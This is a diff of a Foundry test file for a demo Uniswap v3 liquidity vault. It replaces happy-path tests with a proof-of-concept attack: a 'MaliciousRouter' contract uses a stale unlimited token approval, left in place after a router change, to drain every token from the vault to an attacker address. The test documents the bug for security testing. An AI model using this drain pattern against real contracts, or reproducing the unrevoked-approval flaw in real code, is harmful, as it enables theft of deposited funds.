@@ -3,14 +3,22 @@ pragma solidity ^0.8.14;
 
 import "forge-std/Test.sol";
 
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 
-import "../src/poolLauncher.sol";
-import "../src/LiquidityProvider.sol";
-import "../src/token.sol";
-import "../src/CLM.sol";
+import "../src/PoolLauncher.sol";
+import "../src/TestToken.sol";
+import "../src/CLM.sol"; // file that contains `contract DemoCLMVault`
 
-contract DemoCLMVaultTest is Test {
+// Simple malicious router that uses its allowance to drain tokens
+contract MaliciousRouter {
+    function drain(address token, address from, address to) external {
+        uint256 bal = IERC20(token).balanceOf(from);
+        IERC20(token).transferFrom(from, to, bal);
+    }
+}
+
+contract CLMAttacksTest is Test {
     // ---- Mainnet Uniswap v3 addresses ----
     // Factory (Ethereum mainnet)
     address constant UNISWAP_V3_FACTORY =
@@ -28,157 +36,134 @@ contract DemoCLMVaultTest is Test {
     TestToken public token0;
     TestToken public token1;
     DemoCLMVault public vault;
-
-    address public pool;
+    IUniswapV3Pool public pool;
 
     function setUp() public {
         // --- fork mainnet ---
-        // requires MAINNET_RPC_URL in .env
         string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
         uint256 forkId = vm.createFork(rpcUrl);
         vm.selectFork(forkId);
 
-        // deploy helper contracts
+        // deploy helper to create a Uniswap v3 pool
         poolLauncher = new PoolLauncher(UNISWAP_V3_FACTORY);
 
         // deploy two custom ERC20s
         token0 = new TestToken("Vault Token 0", "VT0");
         token1 = new TestToken("Vault Token 1", "VT1");
 
-        // mint tokens to this test contract (will act as user+admin)
-        token0.mint(address(this), 1_000_000 ether);
-        token1.mint(address(this), 1_000_000 ether);
-
-        // create & initialize Uniswap v3 pool via PoolLauncher
-        // using your calculateSqrtPriceX96 helper: ~1:1 price, both 18 decimals
+        // initialize pool at ~1:1 price (both 18 decimals)
         uint160 sqrtPriceX96 = poolLauncher.calculateSqrtPriceX96(
             1e18, // price
             18,   // decimals0
             18    // decimals1
         );
 
-        pool = poolLauncher.createAndInitializePool(
+        address poolAddr = poolLauncher.createAndInitializePool(
             address(token0),
             address(token1),
-            3000,        // 0.3% fee tier
+            3000,        // 0.3% fee
             sqrtPriceX96
         );
+        pool = IUniswapV3Pool(poolAddr);
 
-        // deploy DemoCLMVault
+        // deploy CLM vault
+        // initial unirouter can be the real router; we'll swap it later
         vault = new DemoCLMVault(
             address(this),                // admin
             address(token0),
             address(token1),
-            pool,
+            address(pool),
             NONFUNGIBLE_POSITION_MANAGER,
-            UNISWAP_V3_SWAP_ROUTER        // unirouter (not used yet in tests)
+            UNISWAP_V3_SWAP_ROUTER
         );
     }
 
-    // ------------------------------------------------
-    // Happy path: deposit + openPosition
-    // ------------------------------------------------
+    /// @notice Demonstrates the "stale router approval" bug:
+    ///         1. Vault gives unlimited approval to old router (malicious).
+    ///         2. Admin updates router via setUnirouter(newRouter) WITHOUT revoking.
+    ///         3. Liquidity is removed, tokens sit in vault.
+    ///         4. Old router still has allowance and drains all tokens.
+    function test_AttackerDrainsVaultViaStaleRouterApproval() public {
+        // ---- actors ----
+        address user = address(0xBEEF);
+        address attacker = address(0xA11CE);
 
-    function testDepositAndOpenPosition() public {
+        // deploy a malicious router
+        MaliciousRouter maliciousRouter = new MaliciousRouter();
+
+        // admin sets unirouter = maliciousRouter
+        vault.setUnirouter(address(maliciousRouter));
+
+        // ---- user deposits into the vault ----
         uint256 amount0 = 1_000 ether;
         uint256 amount1 = 1_000 ether;
 
-        // approve vault to pull tokens
+        // mint tokens to user
+        token0.mint(user, amount0);
+        token1.mint(user, amount1);
+
+        vm.startPrank(user);
         token0.approve(address(vault), amount0);
         token1.approve(address(vault), amount1);
-
-        // user deposits into vault
-        uint256 mintedShares = vault.deposit(amount0, amount1);
-        assertGt(mintedShares, 0, "shares should be > 0");
-        assertEq(vault.totalShares(), mintedShares, "totalShares mismatch");
-        assertEq(vault.shares(address(this)), mintedShares, "user shares mismatch");
-
-        // admin opens a Uniswap v3 position using vault funds
-        vault.openPosition();
-
-        uint256 tokenId = vault.currentPositionId();
-        assertGt(tokenId, 0, "positionId should be > 0");
-
-        // pool should now have some liquidity
-        uint128 liquidity = IUniswapV3Pool(pool).liquidity();
-        assertGt(liquidity, 0, "pool liquidity should be > 0");
-    }
-
-    // ------------------------------------------------
-    // Happy path: deposit + openPosition + rebalance
-    // ------------------------------------------------
-
-    function testRebalanceAfterOpenPosition() public {
-        uint256 amount0 = 2_000 ether;
-        uint256 amount1 = 2_000 ether;
-
-        token0.approve(address(vault), amount0);
-        token1.approve(address(vault), amount1);
-
         vault.deposit(amount0, amount1);
+        vm.stopPrank();
 
-        // open initial position
-        vault.openPosition();
-        uint256 tokenIdBefore = vault.currentPositionId();
-        assertGt(tokenIdBefore, 0, "no position after openPosition");
+        // At this point, vault holds user tokens directly.
 
-        uint128 liquidityBefore = IUniswapV3Pool(pool).liquidity();
-        assertGt(liquidityBefore, 0, "no liquidity before rebalance");
+        // ---- admin calls unpause() to "set things up" ----
+        // This will:
+        //  - call _giveAllowances() and give unlimited approvals to maliciousRouter
+        //  - compute ticks from slot0
+        //  - add all vault balances as Uniswap liquidity (currentPositionId != 0)
+        vault.unpause();
 
-        // rebalance via the "safe" path (uses onlyCalmPeriods / TWAP check)
-        vault.rebalance();
+        // Now:
+        //  - maliciousRouter has unlimited allowance on token0 & token1 from vault
+        //  - user funds are in the LP position
 
-        uint256 tokenIdAfter = vault.currentPositionId();
-        uint128 liquidityAfter = IUniswapV3Pool(pool).liquidity();
+        // ---- admin "upgrades" router to a new address (but DOES NOT revoke old approvals) ----
+        address newRouter = address(0x1234);
+        vault.setUnirouter(newRouter);
 
-        // We expect to still have a position and liquidity.
-        // In this demo, we don't assert exact values, just that something exists.
-        assertGt(tokenIdAfter, 0, "no position after rebalance");
-        assertGt(liquidityAfter, 0, "no liquidity after rebalance");
-    }
+        // Approvals for maliciousRouter are still in place.
 
-    // ------------------------------------------------
-    // Sanity: setPositionWidth path redeploys without TWAP (future attack vector)
-    // ------------------------------------------------
+        // ---- later, admin decides to pause the strategy ----
+        // This removes all Uniswap liquidity back into the vault.
+        vault.pause();
 
-    function testSetPositionWidthRedeploysLiquidity() public {
-        uint256 amount0 = 1_000 ether;
-        uint256 amount1 = 1_000 ether;
+        // vault now holds the tokens again, but maliciousRouter still has allowances.
+        uint256 vaultToken0Before = token0.balanceOf(address(vault));
+        uint256 vaultToken1Before = token1.balanceOf(address(vault));
+        assertGt(vaultToken0Before + vaultToken1Before, 0, "vault should hold tokens before attack");
 
-        token0.approve(address(vault), amount0);
-        token1.approve(address(vault), amount1);
+        uint256 attackerToken0Before = token0.balanceOf(attacker);
+        uint256 attackerToken1Before = token1.balanceOf(attacker);
 
-        vault.deposit(amount0, amount1);
+        // ---- attacker triggers the old router to drain funds using stale allowance ----
+        // Note: When we call maliciousRouter.drain, msg.sender for the ERC20 is maliciousRouter,
+        //       which is exactly the address that the vault approved in _giveAllowances().
+        maliciousRouter.drain(address(token0), address(vault), attacker);
+        maliciousRouter.drain(address(token1), address(vault), attacker);
 
-        // open initial position
-        vault.openPosition();
-        uint256 tokenIdBefore = vault.currentPositionId();
-        assertGt(tokenIdBefore, 0, "no position after openPosition");
+        uint256 vaultToken0After = token0.balanceOf(address(vault));
+        uint256 vaultToken1After = token1.balanceOf(address(vault));
 
-        uint128 liquidityBefore = IUniswapV3Pool(pool).liquidity();
-        assertGt(liquidityBefore, 0, "no liquidity before setPositionWidth");
+        uint256 attackerToken0After = token0.balanceOf(attacker);
+        uint256 attackerToken1After = token1.balanceOf(attacker);
 
-        int24 oldWidth = vault.positionWidth();
-        int24 newWidth = oldWidth * 2;
+        // ---- assertions: vault drained, attacker enriched ----
+        assertEq(vaultToken0After, 0, "vault token0 should be fully drained");
+        assertEq(vaultToken1After, 0, "vault token1 should be fully drained");
 
-        // This call:
-        //  - claims earnings (stub right now)
-        //  - removes liquidity
-        //  - updates positionWidth
-        //  - recomputes ticks from slot0
-        //  - re-adds liquidity WITHOUT TWAP guard
-        vault.setPositionWidth(newWidth);
-
-        // Position ID should still be non-zero (may or may not change in this impl)
-        uint256 tokenIdAfter = vault.currentPositionId();
-        assertGt(tokenIdAfter, 0, "no position after setPositionWidth");
-
-        uint128 liquidityAfter = IUniswapV3Pool(pool).liquidity();
-        assertGt(liquidityAfter, 0, "no liquidity after setPositionWidth");
-
-        // and width really changed
-        assertEq(vault.positionWidth(), newWidth, "positionWidth not updated");
-
-        // Later we’ll add an attack test that sandwiches this call.
+        assertEq(
+            attackerToken0After,
+            attackerToken0Before + vaultToken0Before,
+            "attacker token0 profit mismatch"
+        );
+        assertEq(
+            attackerToken1After,
+            attackerToken1Before + vaultToken1Before,
+            "attacker token1 profit mismatch"
+        );
     }
 }
